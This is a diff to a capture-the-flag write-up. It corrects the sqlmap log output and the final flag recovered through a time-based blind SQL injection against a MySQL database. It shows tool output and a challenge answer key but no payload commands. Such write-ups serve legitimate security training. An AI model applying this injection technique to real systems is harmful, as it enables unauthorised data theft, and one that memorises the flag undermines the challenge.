@@ -164,14 +164,17 @@ back-end DBMS: MySQL >= 5.0.12
 [15:35:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
 do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
 [15:36:39] [INFO] adjusting time delay to 2 seconds due to good response times
-bucke
+bucket{j01
 [15:37:31] [ERROR] invalid character detected. retrying..
 [15:37:31] [WARNING] increasing time delay to 3 seconds
-t{j0
+n5_m4k3_n0_53
 [15:38:58] [ERROR] invalid character detected. retrying..
 [15:39:30] [ERROR] invalid character detected. retrying..
 [15:39:30] [WARNING] increasing time delay to 6 seconds
-1n5_m4k%}
+n53_a5ed15}
+[15:42:30] [ERROR] invalid character detected. retrying..
+[15:42:30] [WARNING] increasing time delay to 8 seconds
+
 
 [*] ending @ 15:47:24 /2023-04-10/
 ```
@@ -182,7 +185,7 @@ The flag was printed in pieces due to time-based SQL injection attack.
 
 ---
 
-**Flag: `bucket{j01n5_m4k%}`**
+**Flag: `bucket{j01n5_m4k3_n0_53n53_a5ed15}`**
 
 ---
 
